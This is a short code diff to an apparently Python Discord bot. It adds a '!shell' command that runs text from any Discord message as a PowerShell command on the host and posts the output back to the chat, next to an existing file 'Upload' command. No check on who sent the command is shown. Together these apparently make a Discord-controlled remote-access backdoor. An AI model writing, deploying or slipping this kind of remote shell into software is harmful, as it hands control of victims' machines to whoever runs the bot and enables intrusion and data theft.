@@ -85,5 +85,15 @@ async def on_message(message):
         embed = discord.Embed(title="Upload", description=f"```{os.path.basename(link)}```", color=0xfafafa)
         await message.reply(embed=embed)
 
+    if message.content.startswith("!shell"):
+        command = message.content.split(" ")[1]
+        output = subprocess.Popen(
+            ["powershell.exe", command], stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE
+        ).communicate()[0].decode("utf-8")
+        if output == "":
+            output = "No output"
+        embed = discord.Embed(title=f"Shell > {os.getcwd()}", description=f"```{output}```", color=0xfafafa)
+        await message.reply(embed=embed)
+
 bot.run(token)
 
